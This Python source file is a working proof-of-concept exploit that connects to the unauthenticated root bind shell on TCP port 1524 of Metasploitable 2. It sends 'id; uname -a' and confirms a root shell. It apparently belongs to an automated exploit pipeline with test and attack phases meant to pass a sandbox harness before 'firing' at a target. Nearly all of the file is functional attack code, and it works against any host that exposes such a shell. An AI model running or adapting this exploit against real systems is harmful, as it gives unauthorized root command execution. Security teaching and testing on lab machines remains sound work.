#!/usr/bin/env python3
"""ingreslock / TCP 1524 bind shell — Metasploitable 2's simplest root pop.

Metasploitable 2 ships an unauthenticated root shell bound to TCP 1524 (nominally
the "ingreslock" service). Unlike the vsftpd backdoor there is NO trigger and NO
auth stage: the shell is already listening, so connecting *is* the exploit. Send a
command and it runs as root — ``id`` returns ``uid=0(root)``. Deterministic and
self-evident.

Sandbox contract (sandbox/run_sandbox.py) — identical to the vsftpd PoC:
  * the target arrives as env var ``TARGET`` (``ip`` or ``ip:port``);
  * the bind-shell port defaults to 1524, override with ``HALO_INGRESLOCK_PORT``;
  * TEST phase runs ``--network=none`` with NO ``TARGET`` — so with no target we
    self-check and exit 0 with real stdout, so the harden loop passes us to the
    fire gate rather than discarding a "broken" script;
  * ATTACK phase sets ``TARGET`` and enables the network — we fire for real and
    print the shell's ``id`` output, which trips agent_loop._SHELL_EVIDENCE.

Only stdlib socket is used, so it runs unchanged in python:3.12-slim.
"""

from __future__ import annotations

import os
import re
import socket
import sys

DEFAULT_PORT = 1524
PROBE_CMD = b"id; uname -a\n"
# A genuine root shell answers uid=0(...). uid=1000 (a normal user) or an empty
# read must NOT count — that is what keeps a patched/absent box from faking a pop.
_ROOT_RE = re.compile(r"uid=0\b")


def _drain(sock: socket.socket, timeout: float) -> bytes:
    """Read until the peer stops talking or the window closes."""
    sock.settimeout(timeout)
    chunks = []
    try:
        while True:
            data = sock.recv(1024)
            if not data:
                break
            chunks.append(data)
    except OSError:
        pass
    return b"".join(chunks)


def exploit(host: str, port: int = DEFAULT_PORT, timeout: float = 8.0) -> str:
    """Talk to the unauthenticated root bind shell and return its output.

    Raises RuntimeError if nothing is listening or the shell is not root — so a
    patched/absent box is reported as a failure, never a false breach.
    """
    try:
        shell = socket.create_connection((host, port), timeout=timeout)
    except OSError as e:
        raise RuntimeError(
            f"no bind shell on {host}:{port} — not backdoored ({e})") from e

    try:
        shell.sendall(PROBE_CMD)
        out = _drain(shell, timeout)
    finally:
        shell.close()

    text = out.decode("utf-8", "replace")
    if not _ROOT_RE.search(text):
        raise RuntimeError(
            f"connected to {host}:{port} but no root shell (output: {text!r})")
    return text


def _selfcheck() -> str:
    """Offline validation for the network-less TEST phase: prove the probe is
    well-formed without touching a target. Emits no placeholder token, so the
    sandbox never mistakes this for an un-filled template."""
    assert PROBE_CMD.strip(), "probe command empty"
    assert _ROOT_RE.search("uid=0(root)"), "root matcher broken"
    return ("SELF-CHECK OK: ingreslock/1524 bind-shell PoC ready — "
            f"port={DEFAULT_PORT} probe={PROBE_CMD.strip().decode()}")


def _parse_target(target: str) -> tuple[str, int]:
    target = target.strip()
    if ":" in target:
        host, _, port = target.rpartition(":")
        if port.isdigit():
            return host, int(port)
    return target, DEFAULT_PORT


def run_from_env(env) -> tuple[int, str]:
    """Return (exit_code, stdout_text). Shared by __main__ and the test suite.

    No TARGET  -> TEST phase: self-check, exit 0 with real stdout (hardens clean).
    TARGET set -> ATTACK phase: fire; exit 0 + shell output on success, else 1.
    """
    target = env.get("TARGET", "").strip()
    if not target:
        return 0, _selfcheck()
    host, port = _parse_target(target)
    port = int(env.get("HALO_INGRESLOCK_PORT", port))
    try:
        out = exploit(host, port=port)
    except Exception as e:  # noqa: BLE001 — any failure is a non-breach, report it
        return 1, f"EXPLOIT FAILED: {e}"
    return 0, f"[ingreslock 1524 bind shell] root shell on {host}:{port}\n{out}"


if __name__ == "__main__":
    rc, out = run_from_env(os.environ)
    print(out)
    sys.exit(rc)
